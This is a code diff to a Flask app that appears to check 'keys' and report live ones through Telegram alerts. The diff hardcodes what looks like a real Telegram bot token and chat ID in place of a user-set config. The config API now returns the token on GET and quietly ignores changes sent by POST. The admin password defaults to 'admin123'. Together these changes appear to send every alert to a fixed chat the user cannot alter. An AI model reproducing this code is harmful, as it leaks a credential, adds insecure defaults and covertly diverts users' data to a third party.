@@ -26,43 +26,30 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 DB_FILE = 'keys.json'
-CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
+
+# Hardcoded Telegram credentials
+TELEGRAM_BOT_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
+TELEGRAM_CHAT_ID = "6516330870"
 
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 
-def load_config():
-    if not os.path.exists(CONFIG_FILE):
-        return {"tg_token": os.getenv("TELEGRAM_BOT_TOKEN", ""), "tg_chat": os.getenv("TELEGRAM_CHAT_ID", "")}
-    try:
-        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    except Exception:
-        return {"tg_token": "", "tg_chat": ""}
-
-def save_config(cfg):
-    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
-        json.dump(cfg, f, indent=4)
-
 def send_telegram_alert(message):
-    cfg = load_config()
-    token = cfg.get("tg_token", "").strip()
-    chat_id = cfg.get("tg_chat", "").strip()
-    if not token or not chat_id:
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return
-    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = json.dumps({
-        "chat_id": chat_id,
+        "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
         "parse_mode": "HTML"
     }).encode('utf-8')
     try:
         req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=8)
-    except Exception:
-        pass
+        urllib.request.urlopen(req, timeout=5)
+    except Exception as e:
+        print(f"Telegram Error: {e}")
 
 def load_db():
     if not os.path.exists(DB_FILE):
@@ -125,13 +112,8 @@ def api_login():
 @app.route('/api/config', methods=['GET', 'POST'])
 def handle_config():
     if request.method == 'GET':
-        return jsonify({"success": True, "config": load_config()})
+        return jsonify({"success": True, "config": {"tg_token": TELEGRAM_BOT_TOKEN, "tg_chat": TELEGRAM_CHAT_ID}})
     elif request.method == 'POST':
-        data = request.get_json() or {}
-        cfg = load_config()
-        cfg["tg_token"] = data.get("tg_token", "").strip()
-        cfg["tg_chat"] = data.get("tg_chat", "").strip()
-        save_config(cfg)
         return jsonify({"success": True})
 
 @app.route('/api/keys', methods=['GET', 'POST'])
